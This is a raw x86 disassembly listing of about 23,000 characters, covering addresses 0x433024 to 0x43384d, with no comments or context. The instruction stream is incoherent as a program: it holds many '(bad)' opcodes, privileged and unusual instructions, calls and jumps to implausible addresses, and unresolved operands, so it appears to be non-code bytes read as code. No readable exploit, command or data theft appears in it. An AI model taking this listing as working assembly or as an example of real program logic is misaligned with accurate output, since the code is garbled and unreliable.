  433024:	mov    ecx,DWORD PTR [ebx+0x489408]
  43302a:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  433030:	push   ecx
  433031:	jo     0x43301b
  433033:	inc    DWORD PTR [edi]
  433035:	or     BYTE PTR [eax],al
  433037:	call   0xce3781
  43303c:	fmul   QWORD PTR [ebp+0x55]
  43303f:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  433045:	mov    bh,0x8c
  433047:	adc    al,0x99
  433049:	dec    esp
  43304a:	xor    bl,BYTE PTR [eax]
  43304c:	mov    ecx,DWORD PTR [ebp+0xc]
  43304f:	mov    eax,DWORD PTR [ebp-0x4]
  433052:	mov    esi,DWORD PTR [edi-0x3148f924]
  433058:	push   es
  433059:	retf   
  43305a:	mov    BYTE PTR [ebp-0x30],0x3b
  43305e:	inc    ebp
  43305f:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  433066:	retf   0x83fc
  433069:	into   
  43306a:	dec    ebp
  43306b:	retf   
  43306c:	mov    ecx,DWORD PTR [ebp-0x74]
  43306f:	mov    eax,DWORD PTR [eax]
  433071:	fdiv   QWORD PTR [ebx]
  433073:	mov    bh,0x3
  433075:	push   es
  433076:	mov    esi,ecx
  433078:	sbb    cl,dl
  43307a:	dec    ebp
  43307b:	sar    DWORD PTR [ebx],cl
  43307d:	push   ebp
  43307e:	jne    0x43308f
  433080:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  433086:	lea    ebx,[eax]
  433088:	call   0xf4ccbc4f
  43308d:	sbb    dh,dl
  43308f:	add    edx,ebx
  433091:	push   ebp
  433092:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  433098:	push   ecx
  433099:	mov    DWORD PTR [eax-0x30],edx
  43309c:	test   DWORD PTR [edx],eax
  43309e:	xadd   esp,esi
  4330a1:	pop    es
  4330a2:	add    cl,dl
  4330a4:	mov    eax,ecx
  4330a6:	or     al,0x45
  4330a8:	(bad)  
  4330a9:	push   eax
  4330aa:	add    DWORD PTR [edx+0x0],eax
  4330ad:	add    ecx,DWORD PTR [ecx]
  4330af:	and    dh,cl
  4330b1:	call   0xc73981
  4330b6:	add    DWORD PTR [ebp+0x0],edx
  4330b9:	mov    esp,DWORD PTR [ebp+0x18]
  4330bc:	add    BYTE PTR [eax+0x48],cl
  4330bf:	xor    eax,DWORD PTR [eax]
  4330c1:	add    esp,DWORD PTR [esi+0x3b]
  4330c4:	inc    ebp
  4330c5:	je     0x43304a
  4330c7:	push   ecx
  4330c8:	push   es
  4330c9:	dec    ebp
  4330ca:	mov    DWORD PTR [ebx],eax
  4330cc:	(bad)  
  4330cd:	or     al,0x5e
  4330cf:	inc    eax
  4330d0:	add    BYTE PTR [ebx],al
  4330d2:	data16 and BYTE PTR [ebp+0x50],al
  4330d6:	sub    DWORD PTR [ecx],0xfffffff8
  4330d9:	add    BYTE PTR [ebp-0x75],ah
  4330dc:	add    BYTE PTR [eax],bl
  4330de:	enter  0x894d,0x8b
  4330e2:	int3   
  4330e3:	loopne 0x43311f
  4330e5:	rol    BYTE PTR [eax],0x33
  4330e8:	lea    cx,[ebp+0xa]
  4330ec:	data16 jb 0x433134
  4330ef:	add    BYTE PTR [ebx+0x44890855],cl
  4330f5:	sbb    ah,al
  4330f7:	inc    ebp
  4330f8:	cmp    BYTE PTR [edi],cl
  4330fa:	add    BYTE PTR [edx+0x66],dl
  4330fd:	xor    ecx,DWORD PTR [eax]
  4330ff:	sub    edi,esi
  433101:	mov    eax,DWORD PTR [eax]
  433103:	or     al,0x66
  433105:	ror    edx,cl
  433107:	dec    ebp
  433108:	inc    ebp
  433109:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  43310f:	cld    
  433110:	or     BYTE PTR [edi+0x4501dd],dl
  433116:	ret    0xe8ce
  433119:	retf   
  43311a:	(bad)  
  43311b:	dec    ebp
  43311c:	mov    al,0x8b
  43311e:	in     al,dx
  43311f:	and    BYTE PTR [ebx],bh
  433121:	or     al,BYTE PTR [ebp+0x27]
  433124:	in     al,dx
  433125:	xchg   eax,ebp
  433127:	add    edi,eax
  433129:	add    BYTE PTR [eax+0x3f52ed55],bh
  43312f:	push   ebp
  433130:	inc    ebp
  433131:	xor    ebx,edx
  433133:	add    ebp,eax
  433135:	push   edx
  433136:	push   bp
  433138:	inc    ebp
  433139:	(bad)  
  43313a:	jmp    0xc342f793
  43313f:	sbb    al,0x33
  433141:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  433148:	add    BYTE PTR [ebp+0x44],0x8b
  43314c:	jmp    0xf98b:0x100041c8
  433153:	xor    esi,DWORD PTR [edx+0x3]
  433156:	mov    ecx,DWORD PTR [edi]
  433158:	fmul   DWORD PTR [edx]
  43315a:	add    BYTE PTR [eax],al
  43315c:	lea    eax,[ebx-0x4700273c]
  433162:	add    al,0x4f
  433164:	pop    DWORD PTR [eax]
  433166:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  43316c:	push   edx
  43316d:	inc    WORD PTR [ebp+0x8]
  433171:	mov    eax,0x514f4d
  433176:	(bad)
  43317a:	add    al,al
  43317c:	xor    DWORD PTR [ebx-0x74baf730],eax
  433182:	test   DWORD PTR [esi+0x74],esp
  433185:	inc    ebp
  433186:	mov    DWORD PTR [eax+0xa4f08],edi
  43318c:	add    BYTE PTR [ecx-0x76c435bb],cl
  433192:	or     dh,cl
  433194:	or     eax,0x8b8d5045
  433199:	inc    ebp
  43319a:	mov    WORD PTR [ecx+0x3b8a00],?
  4331a0:	jne    0x4331d5
  4331a2:	mov    edi,DWORD PTR [edx+0x8f3a18]
  4331a8:	add    DWORD PTR [ebx],eax
  4331aa:	add    bh,bh
  4331ac:	adc    DWORD PTR [eax],ecx
  4331ae:	adc    DWORD PTR [ebp+0x55],edi
  4331b1:	push   es
  4331b2:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  4331b8:	mov    ebp,DWORD PTR [eax+ebp*1+0x50c411da]
  4331bf:	inc    ebp
  4331c0:	mov    esp,edi
  4331c2:	or     al,0xda
  4331c4:	push   eax
  4331c5:	(bad)  
  4331c6:	jne    0x43317c
  4331c8:	call   0x3b2ab7
  4331cd:	inc    ebp
  4331ce:	rol    ah,0x84
  4331d1:	call   0xbc43f8d6
  4331d6:	jne    0x4331b2
  4331d8:	mov    ebx,ebx
  4331da:	inc    edi
  4331dc:	and    al,al
  4331de:	fs jmp 0x7ec877e3
  4331e4:	bswap  ecx
  4331e6:	scas   al,BYTE PTR es:[edi]
  4331e7:	inc    esp
  4331e8:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  4331ef:	or     BYTE PTR [ebx-0x97717c6],0x83
  4331f6:	call   DWORD PTR [edi]
  4331f8:	shr    ah,0x84
  4331fb:	xchg   DWORD PTR [eax],eax
  4331fd:	add    DWORD PTR [eax],eax
  4331ff:	add    bh,bh
  433201:	dec    ebp
  433202:	and    BYTE PTR [ecx-0x38],dl
  433205:	push   eax
  433206:	dec    DWORD PTR [ebx+0xfd885]
  43320c:	mov    BYTE PTR [ebp+0x508bac00],cl
  433212:	mov    WORD PTR [ecx+0x0],ss
  433215:	lea    ecx,[ebx+0x108b20d8]
  43321b:	mov    WORD PTR [edx],ds
  43321d:	add    BYTE PTR [edi+0xff01ff],al
  433223:	mov    ecx,DWORD PTR [ebp-0x28]
  433226:	push   ecx
  433227:	shl    BYTE PTR [ebp+0x3a],0x8b
  43322b:	inc    ebp
  43322c:	in     al,0xeb
  43322e:	jno    0x4331bb
  433230:	push   edx
  433231:	mov    DWORD PTR [eax-0x28],edx
  433234:	mov    eax,DWORD PTR [ebp+0x20]
  433237:	je     0x4331c0
  433239:	mov    eax,DWORD PTR [ecx]
  43323b:	sbb    BYTE PTR [eax],al
  43323d:	pop    DWORD PTR [eax]
  43323f:	add    esi,eax
  433241:	add    bl,al
  433243:	adc    DWORD PTR [edi],esi
  433245:	jmp    0x8bce8297
  43324a:	sub    BYTE PTR [ebp+eax*2-0x63c4ca00],cl
  433251:	jne    0x4331de
  433253:	mov    ecx,DWORD PTR [eax]
  433255:	in     al,0x75
  433257:	pop    DWORD PTR [ecx+0x5101]
  43325d:	push   edx
  43325e:	inc    DWORD PTR [ebx]
  433260:	adc    BYTE PTR [ecx+0x45721cc6],cl
  433266:	add    BYTE PTR [edi+0x9],dl
  433269:	call   DWORD PTR [esi]
  43326b:	and    dl,al
  43326d:	and    bh,bh
  43326f:	inc    edi
  433271:	test   eax,edx
  433273:	sldt   ebx
  433276:	cmp    DWORD PTR [eax],eax
  433278:	pushf  
  433279:	(bad)  
  43327a:	jmp    0x433288
  43327c:	mov    eax,edi
  43327e:	or     al,0x75
  433280:	inc    eax
  433281:	call   0x432989
  433286:	mov    eax,eax
  433288:	loopne 0x43320e
  43328a:	inc    ebp
  43328b:	add    BYTE PTR [ebx+0x1451c00],cl
  433291:	mov    eax,DWORD PTR [ebp+0x20]
  433294:	add    edi,ecx
  433296:	add    BYTE PTR [eax],ch
  433298:	cmp    edi,0x18
  43329b:	test   DWORD PTR [ebp+0xf],esi
  43329e:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  4332a5:	jne    0x4332a9
  4332a7:	call   0xffa22d6c
  4332ac:	leave  
  4332ad:	rcr    BYTE PTR [esp+eax*4],0x55
  4332b1:	add    ah,ch
  4332b3:	add    BYTE PTR [edi-0x48fef979],dh
  4332b9:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  4332c0:	inc    esp
  4332c1:	mov    ebx,DWORD PTR [eax]
  4332c3:	fcom   st(2)
  4332c5:	add    BYTE PTR [edi],bl
  4332c7:	lea    ecx,[eax-0x18]
  4332ca:	(bad)  
  4332cb:	push   DWORD PTR [ecx]
  4332cd:	call   0xffb5802f
  4332d2:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  4332d6:	fstp   DWORD PTR [esi+ebx*8]
  4332d9:	push   ebp
  4332da:	pop    ebp
  4332db:	mov    esi,DWORD PTR [edx-0x38]
  4332de:	add    DWORD PTR [eax],0x28
  4332e1:	mov    edi,DWORD PTR [ebx]
  4332e3:	xor    esi,DWORD PTR [edx+0x3]
  4332e6:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  4332ea:	pop    ebp
  4332eb:	or     al,0x4
  4332ed:	inc    ecx
  4332ee:	push   ebp
  4332ef:	(bad)  
  4332f0:	in     al,dx
  4332f1:	or     ah,ch
  4332f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4332f4:	xbegin 0xffc8a8ea
  4332fa:	clc    
  4332fb:	adc    al,0x45
  4332fd:	idiv   BYTE PTR [ecx]
  4332ff:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  433306:	test   DWORD PTR [ecx+0x665b00f8],ebx
  43330c:	add    BYTE PTR [ecx+0x66],dh
  43330f:	add    eax,DWORD PTR [ebp+0x52]
  433312:	adc    eax,0x20
  433315:	xchg   DWORD PTR [ecx+0x4400fc01],ecx
  43331b:	test   DWORD PTR [eax],eax
  43331d:	clc    
  43331e:	data16 or al,BYTE PTR [ebp+0x45]
  433322:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  433329:	rol    BYTE PTR [ebp+0x45],1
  43332c:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  433332:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  433338:	push   ebx
  433339:	add    BYTE PTR [ecx+0x0],dl
  43333c:	push   ecx
  43333d:	jge    0x433372
  43333f:	add    BYTE PTR [esi+0x4],dl
  433342:	jne    0x4333a9
  433344:	mov    edx,0x457200
  433349:	jmp    0x43330d
  43334b:	xor    edi,DWORD PTR [ebx]
  43334d:	pop    edi
  43334e:	cvtdq2ps xmm7,xmm0
  433351:	ret    0x0
  433354:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  43335a:	xor    ecx,DWORD PTR [edi]
  43335c:	add    eax,DWORD PTR [ecx+0x3b]
  43335f:	push   ebx
  433360:	rdpmc  
  433362:	out    0x8d,al
  433364:	add    BYTE PTR [eax],cl
  433366:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  43336c:	ret    0x450c
  43336f:	sbb    al,0x8b
  433371:	cmp    eax,esi
  433373:	or     cl,al
  433375:	or     al,0xc2
  433377:	pop    eax
  433378:	inc    ebp
  433379:	add    ecx,DWORD PTR [edi]
  43337b:	add    esi,DWORD PTR [ebp+0x39]
  43337e:	invd   
  433380:	jge    0x43338c
  433382:	mov    eax,0x478ac0
  433387:	cli    
  433388:	xor    esp,ecx
  43338a:	mov    ebx,0x5b8ac0
  43338f:	ret    0x33
  433392:	mov    eax,0x833a8b
  433397:	sub    BYTE PTR [ebx],al
  433399:	inc    ebp
  43339a:	data16 ss clc 
  43339d:	pushf  
  43339e:	inc    bh
  4333a0:	mov    esp,esp
  4333a2:	hlt    
  4333a3:	test   DWORD PTR [ebp-0x8],esi
  4333a6:	mov    eax,DWORD PTR [ebp-0x14]
  4333a9:	cmp    BYTE PTR [ebx-0x76478864],cl
  4333af:	dec    edi
  4333b0:	or     BYTE PTR [eax],al
  4333b2:	jne    0x43333d
  4333b4:	mov    esi,esp
  4333b6:	call   0x77a9bf7b
  4333bb:	inc    ebp
  4333bc:	mov    DWORD PTR [eax+0x994f0c],edi
  4333c2:	add    BYTE PTR [ecx-0x3ffe0717],cl
  4333c8:	add    BYTE PTR [esi+0x7d],ah
  4333cb:	inc    ebp
  4333cc:	mov    bx,WORD PTR [ebp+0x8]
  4333d0:	add    DWORD PTR [ebp+0x51],0x30c008b
  4333d7:	inc    ebp
  4333d8:	mov    bx,di
  4333db:	lock test BYTE PTR [ecx+0x7000801],bh
  4333e2:	jge    0x4333a5
  4333e4:	mov    ecx,DWORD PTR [ebx-0x660613f0]
  4333ea:	cli    
  4333eb:	xor    bl,bh
  4333ed:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  4333f3:	test   BYTE PTR [eax],cl
  4333f5:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  4333fc:	cmp    ebp,eax
  4333fe:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  433405:	test   BYTE PTR [ebp+0x1],bh
  433408:	mov    ebx,0x458a00
  43340d:	xor    esi,DWORD PTR [ebx]
  43340f:	add    esp,DWORD PTR [esi-0x77]
  433412:	pop    ebp
  433413:	loopne 0x43347b
  433415:	inc    ebp
  433416:	clc    
  433417:	xor    edi,DWORD PTR [ebx]
  433419:	add    esi,DWORD PTR [edx-0x77]
  43341c:	data16 fdivr QWORD PTR [ebp-0x49]
  433420:	mov    ebx,0xb78afc
  433425:	hlt    
  433426:	xor    edi,DWORD PTR [eax]
  433428:	data16 add BYTE PTR [ebp+0x66],bl
  43342c:	data16 lock clc 
  43342f:	cmp    BYTE PTR [ebx],bh
  433431:	add    BYTE PTR [edi+0x66],dh
  433434:	psubq  mm7,QWORD PTR [ebp-0x2]
  433438:	ltr    WORD PTR [ebp+0x66]
  43343c:	add    esi,eax
  43343e:	add    di,WORD PTR [ebp+0x2b]
  433442:	data16 data16 jge 0x4334c3
  433446:	mov    ebx,0xe08a8b
  43344b:	jge    0x433480
  43344d:	data16 data16 xor al,0x5d
  433451:	data16 data16 jne 0x43344d
  433455:	mov    edi,DWORD PTR [ebx]
  433457:	fdiv   QWORD PTR [edx+0x7d]
  43345a:	data16 data16 jge 0x433492
  43345e:	mov    ebx,0x758a66
  433463:	mov    esi,0x667233
  433468:	pop    ebp
  433469:	or     BYTE PTR [esi+0x0],ah
  43346c:	clc    
  43346d:	mov    edi,DWORD PTR [ebx]
  43346f:	lock ja 0x4333fd
  433472:	(bad)  
  433474:	jge    0x43346d
  433476:	invd   
  433478:	pop    ebp
  433479:	add    BYTE PTR [ebx],al
  43347b:	(bad)  
  43347c:	cmp    di,WORD PTR [ebp+0xf]
  433480:	data16 sbb bh,BYTE PTR [ebp+0x0]
  433484:	mov    bx,WORD PTR [ebp-0x10]
  433488:	pop    bp
  43348a:	fbstp  TBYTE PTR [ebx]
  43348c:	test   DWORD PTR [ebx],eax
  43348e:	add    BYTE PTR [ebx],bh
  433490:	add    BYTE PTR [esi+0x7d],ah
  433493:	jge    0x433420
  433495:	data16 in al,dx
  433497:	pop    ebp
  433498:	stc    
  433499:	bsf    ecx,DWORD PTR [ebp+0x66320099]
  4334a0:	mov    edi,ebx
  4334a2:	in     al,dx
  4334a3:	test   BYTE PTR [ebp+0x0],bh
  4334a6:	mov    eax,DWORD PTR [eax]
  4334a8:	call   0xbd402e38
  4334ad:	cmp    BYTE PTR [ecx-0x7699ce00],bl
  4334b3:	sti    
  4334b4:	call   0x8b4bb244
  4334b9:	add    ebp,esp
  4334bb:	mov    bx,di
  4334be:	jnp    0x4334e6
  4334c0:	mov    DWORD PTR [ebx+0x387df808],ecx
  4334c6:	mov    eax,DWORD PTR [eax]
  4334c8:	call   0x7c3ec033
  4334cd:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  4334d3:	data16 data16 fistp WORD PTR [ebp+0xe]
  4334d8:	xor    DWORD PTR [edi-0x48fff7af],0xfb66f403
  4334e2:	fisttp WORD PTR [ecx-0x7401f77b]
  4334e8:	(bad)  
  4334e9:	cld    
  4334ea:	jne    0x433524
  4334ec:	xor    eax,DWORD PTR [eax]
  4334ee:	mov    esp,DWORD PTR [esi-0x10]
  4334f1:	sti    
  4334f2:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  4334f9:	data16 adc bl,bh
  4334fc:	push   ebp
  4334fd:	xor    ecx,DWORD PTR es:[ebx+0x38e4f88b]
  433504:	mov    WORD PTR [eax],es
  433506:	cdq    
  433507:	data16 xor bh,bl
  43350a:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  433510:	mov    esp,DWORD PTR [esi-0x14]
  433513:	fisttp WORD PTR [ebx-0x3748a9f2]
  433519:	or     al,0x2b
  43351b:	mov    bh,0xba
  43351d:	hlt    
  43351e:	mov    bh,bl
  433520:	add    BYTE PTR [ecx-0x7446f3cd],cl
  433526:	dec    edi
  433527:	or     al,0x0
  433529:	mov    edi,DWORD PTR [ebx]
  43352b:	or     BYTE PTR [ebp+0x3b],dh
  43352e:	mov    ecx,DWORD PTR [edi]
  433530:	fdivr  QWORD PTR [ebx-0x7499ff83]
  433536:	xor    al,0xd8
  433538:	pop    bp
  43353a:	lock xor esi,DWORD PTR [ebx]
  43353d:	lea    esp,[esi+0x1f]
  433540:	icebp  
  433541:	jb     0x433547
  433543:	add    al,al
  433545:	jge    0x433553
  433547:	mov    eax,eax
  433549:	fsubr  st,st(3)
  43354b:	pop    ebp
  43354c:	mov    esi,DWORD PTR [ebx]
  43354e:	in     al,0x8d
  433550:	rcr    DWORD PTR [edi],0xc2
  433553:	jb     0x4335b3
  433555:	add    cl,cl
  433557:	jge    0x433565
  433559:	mov    edx,DWORD PTR [ebp-0x20]
  43355c:	in     al,dx
  43355d:	pop    ebp
  43355e:	data16 data16 or BYTE PTR [esi+edi*4],bh
  433563:	data16 cmp bh,BYTE PTR [ebp+0x0]
  433567:	mov    ebp,DWORD PTR [ebx]
  433569:	fdivr  QWORD PTR [esi+0x668a5d]
  43356f:	cmp    al,0x33
  433571:	mov    si,0x4f7d
  433575:	mov    eax,DWORD PTR [eax]
  433577:	lock inc ebp
  433579:	mov    esi,DWORD PTR [edi]
  43357b:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  433582:	clc    
  433583:	(bad)  
  433584:	cmp    edi,DWORD PTR [ebx]
  433586:	je     0x433597
  433588:	push   ebx
  433589:	loopne 0x43359a
  43358b:	dec    ecx
  43358d:	mov    esp,DWORD PTR [edi-0x1c]
  433590:	int    0xf1
  433592:	mov    esi,0x703084d
  433597:	pcmpgtd mm6,mm1
  43359a:	add    BYTE PTR [ebp+0x66],dh
  43359d:	jmp    0x43356a
  43359f:	mov    eax,DWORD PTR [ebx]
  4335a1:	lock push ebp
  4335a3:	ror    DWORD PTR [ebp-0x2972feb3],1
  4335a9:	or     bh,dl
  4335ab:	jb     0x4335ab
  4335ad:	add    BYTE PTR [ebx-0x1a7487b3],cl
  4335b3:	loopne 0x4335b5
  4335b5:	jne    0x4335b5
  4335b7:	data16 add BYTE PTR [esi+eiz*2],dh
  4335bb:	mov    ecx,ebx
  4335bd:	data16 cmp cl,dh
  4335c0:	add    BYTE PTR [eax],bh
  4335c2:	data16 add bl,cl
  4335c5:	data16 cmp dh,dl
  4335c8:	add    BYTE PTR [edx],bh
  4335ca:	data16 add bl,cl
  4335cd:	enterw 0x4df1,0x19
  4335d2:	pop    edi
  4335d3:	jne    0x433556
  4335d5:	mov    esi,DWORD PTR [edi]
  4335d7:	call   0x77b7c178
  4335dc:	xor    ebp,DWORD PTR [ebx]
  4335de:	lea    esp,[esi+0x48]
  4335e1:	repnz in eax,0x3b
  4335e4:	add    BYTE PTR [ebp-0x37],dh
  4335e7:	xor    edx,DWORD PTR [ebp-0x15]
  4335ea:	in     al,dx
  4335eb:	xor    edx,DWORD PTR [esi+0x40]
  4335ee:	mov    DWORD PTR [edi],0x338545fc
  4335f4:	clc    
  4335f5:	add    esi,DWORD PTR [esi]
  4335f7:	pop    edi
  4335f8:	pushf  
  4335f9:	pop    ebx
  4335fa:	call   0xff4435c1
  4335ff:	mov    edi,eax
  433601:	push   ecx
  433602:	pop    es
  433603:	mov    edi,DWORD PTR [edx]
  433605:	push   esi
  433606:	inc    esp
  433607:	(bad)  
  433608:	jle    0x43360a
  43360a:	popa   
  43360b:	data16 (bad) 
  43360d:	into   
  43360e:	addr16 cmp ch,cl
  433611:	add    BYTE PTR [ecx+0x7ce0866],bh
  433617:	cmp    ah,BYTE PTR [esi+0x0]
  43361a:	add    bh,al
  43361c:	(bad)  
  43361d:	cld    
  43361e:	add    BYTE PTR [ebp+0x36c3f866],al
  433624:	cmp    BYTE PTR [eax+eax*1-0x3c31999a],bl
  43362b:	pop    ebp
  43362c:	or     BYTE PTR [edi+0x0],dl
  43362f:	mov    bh,0x66
  433631:	mov    edi,0xff038dc3
  433636:	jne    0x433689
  433638:	lea    edx,[ecx+0x1]
  43363b:	mov    ebx,0xd64ff1
  433640:	sar    DWORD PTR [ebx],1
  433642:	test   BYTE PTR [ebp+0x32],dh
  433645:	mov    DWORD PTR [esp+edi*8-0x76],esp
  433649:	push   edi
  43364a:	xor    BYTE PTR [ebx],0x3a
  43364d:	mov    esi,ebx
  43364f:	xor    eax,DWORD PTR [eax-0x3c73819a]
  433655:	xor    al,BYTE PTR [ebp+0x64]
  433658:	pop    ebx
  433659:	mov    ebx,0x9c3a37
  43365e:	je     0x43368b
  433660:	xor    edi,DWORD PTR [ebx+0x668a33]
  433666:	mov    WORD PTR [ebx],?
  433668:	xor    bh,BYTE PTR [ebx+0x8b4f64]
  43366e:	pop    edi
  43366f:	cmp    ecx,ecx
  433671:	jne    0x4336c8
  433673:	mov    ebp,esp
  433675:	cld    
  433676:	push   esi
  433677:	pop    ebx
  433678:	inc    ebp
  433679:	stc    
  43367a:	aaa    
  43367b:	test   DWORD PTR [eax+edi*8-0x317af642],ebx
  433682:	clc    
  433683:	test   dl,dl
  433685:	xor    al,0xff
  433687:	fs pop si
  43368a:	or     bl,al
  43368c:	dec    BYTE PTR [ebx+0x57665100]
  433692:	retf   0x3845
  433695:	aaa    
  433696:	add    BYTE PTR [esi+eiz*2+0x3a85cabe],bl
  43369d:	clc    
  43369e:	add    BYTE PTR [ebx+0x66],bl
  4336a1:	dec    edx
  4336a3:	mov    edx,DWORD PTR [edi-0x76]
  4336a6:	push   edi
  4336a7:	add    al,0xb7
  4336a9:	xor    al,0xba
  4336ab:	cmp    al,0x8d
  4336ad:	je     0x4336ae
  4336af:	mov    edx,DWORD PTR [ecx-0x46]
  4336b2:	push   ecx
  4336b3:	lea    edi,[ebx+0x514fff]
  4336b9:	push   ecx
  4336ba:	cmp    edx,DWORD PTR [ebx+0x75]
  4336bd:	mov    ecx,DWORD PTR [ecx+0x723afcbb]
  4336c3:	add    BYTE PTR [ebx],dh
  4336c5:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  4336cb:	add    BYTE PTR [ebx+esi*1+0x4f64bb32],cl
  4336d2:	mov    ebx,0x3b3a00
  4336d7:	jne    0x433704
  4336d9:	mov    DWORD PTR [ebx+0x728afc],edi
  4336df:	xor    esi,DWORD PTR [ebx]
  4336e1:	mov    edi,DWORD PTR [ebx+0x8d4f33]
  4336e7:	push   edi
  4336e8:	cmp    esp,ebp
  4336ea:	jne    0x4336ec
  4336ec:	sbb    DWORD PTR [eax],0x8085c3fc
  4336f2:	clc    
  4336f3:	inc    esp
  4336f4:	pop    ebx
  4336f5:	sti    
  4336f6:	add    eax,0xeb8bc075
  4336fb:	cld    
  4336fc:	xor    edi,DWORD PTR ds:0xf8c3855e
  433702:	mov    ecx,DWORD PTR [ecx+edx*2]
  433705:	rol    DWORD PTR [ebp-0x37],0xf
  433709:	mov    DWORD PTR [eax],ecx
  43370b:	inc    edi
  43370c:	(bad)  
  43370d:	in     eax,0x2
  43370f:	add    bh,bh
  433711:	(bad)  
  433712:	mov    esi,0xc38a5e
  433717:	mov    esi,DWORD PTR [ebx]
  433719:	push   ecx
  43371a:	mov    edi,0xfc4fc7
  43371f:	test   DWORD PTR [ebp-0x8],edx
  433722:	data16 ss (bad) 
  433725:	pushf  
  433726:	sub    ebp,eax
  433728:	inc    ebp
  433729:	(bad)  
  43372a:	sub    edi,edi
  43372c:	mov    DWORD PTR [ebx+0x3a03ba08],ecx
  433732:	inc    ebp
  433733:	add    BYTE PTR [esi+0x2b],ah
  433736:	or     bh,BYTE PTR [edx+0xf8ac2]
  43373c:	cmp    al,0x33
  43373e:	mov    edi,DWORD PTR [edx+0x24f81]
  433744:	(bad)  
  433745:	cmp    esi,DWORD PTR [ebx]
  433747:	je     0x433701
  433749:	push   ebx
  43374a:	dec    edi
  43374b:	str    ecx
  43374e:	cmp    esp,DWORD PTR [edi+0x75]
  433751:	int    0x33
  433753:	mov    edi,0x789085f
  433758:	mov    ecx,DWORD PTR [eax]
  43375a:	cld    
  43375b:	add    cl,cl
  43375d:	data16 add al,0xcb
  433760:	push   ebp
  433761:	add    ebp,esp
  433763:	jne    0x433751
  433765:	(bad)  
  433766:	mov    DWORD PTR [ecx],0xd685f7ec
  43376c:	clc    
  43376d:	xlat   BYTE PTR ds:[ebx]
  43376e:	inc    ebp
  43376f:	mov    edi,DWORD PTR [ecx]
  433771:	push   eax
  433772:	pushf  
  433773:	in     eax,0x8b
  433775:	add    ah,ch
  433777:	(bad)  
  433778:	push   ecx
  433779:	add    BYTE PTR [ecx+0x66],dl
  43377c:	add    eax,0x3872cb
  433781:	add    BYTE PTR [ebp+0x66],al
  433784:	(bad)  
  433785:	retf   
  433786:	lock cmp al,BYTE PTR [ebp+0x4566f800]
  43378d:	retf   
  43378e:	cmp    cl,al
  433790:	pushf  
  433791:	jge    0x43375a
  433793:	aaa    
  433794:	cld    
  433795:	pushf  
  433796:	test   DWORD PTR [edi-0x8],ebx
  433799:	je     0x4337e0
  43379b:	xor    esi,DWORD PTR ds:0x7020840
  4337a1:	ror    BYTE PTR [ebp-0x37],0x8d
  4337a5:	push   ebp
  4337a6:	add    esp,ebp
  4337a8:	jb     0x433735
  4337aa:	add    BYTE PTR [eax],cl
  4337ac:	dec    ebp
  4337ad:	mov    bh,0x81
  4337af:	push   esi
  4337b0:	push   ecx
  4337b1:	adc    DWORD PTR [ecx-0x3b],0x3899ff81
  4337b8:	xor    al,BYTE PTR [eax]
  4337ba:	mov    edx,DWORD PTR [edi+0x10]
  4337bd:	(bad)  
  4337be:	scas   eax,DWORD PTR es:[edi]
  4337bf:	cmp    bh,BYTE PTR [ebx]
  4337c1:	add    BYTE PTR [edi],cl
  4337c3:	mov    ebp,ebp
  4337c5:	cld    
  4337c6:	add    BYTE PTR [ebx],bh
  4337c8:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  4337cc:	dec    ebp
  4337cd:	or     BYTE PTR [ebx],ch
  4337cf:	ret    0x458b
  4337d2:	lock jmp 0x4337c6
  4337d5:	mov    ecx,DWORD PTR [eax]
  4337d7:	or     BYTE PTR [edi],al
  4337d9:	mov    ecx,eax
  4337db:	xor    DWORD PTR [edx+0x2],0x0
  4337df:	mov    bh,0xc1
  4337e1:	adc    BYTE PTR [eax],dh
  4337e3:	iret   
  4337e4:	inc    ebp
  4337e5:	mov    DWORD PTR [ebx],0x4dfff8c5
  4337eb:	inc    BYTE PTR [ebx]
  4337ed:	cmp    bh,al
  4337ef:	add    BYTE PTR [ecx],dl
  4337f1:	data16 adc al,bh
  4337f4:	dec    ecx
  4337f5:	fisttp WORD PTR [ecx+0x456604c0]
  4337fb:	add    dh,BYTE PTR ds:0x75e0845
  433801:	ret    0x4d
  433804:	lea    ecx,[ebx+0x18728301]
  43380a:	add    BYTE PTR [ebp+0x45],al
  43380d:	ss jmp 0x10a38af
  433813:	call   0xf8cebd5d
  433818:	clc    
  433819:	inc    ebp
  43381a:	shl    DWORD PTR ds:0x781084d,0x51
  433821:	cdq    
  433822:	push   ecx
  433823:	xor    al,BYTE PTR [ecx+0x32f89989]
  433829:	inc    ebp
  43382a:	cmp    edi,DWORD PTR [esi]
  43382c:	jbe    0x4337ca
  43382e:	mov    eax,edi
  433830:	or     ah,dh
  433832:	inc    ebp
  433833:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  433839:	cmp    BYTE PTR [ebx-0x74747664],cl
  43383f:	in     al,dx
  433840:	hlt    
  433841:	push   ecx
  433842:	push   ecx
  433843:	push   ecx
  433844:	push   ecx
  433845:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  43384b:	cdq    
  43384c:	cdq    
  43384d:	xor    dh,BYTE PTR [edx]
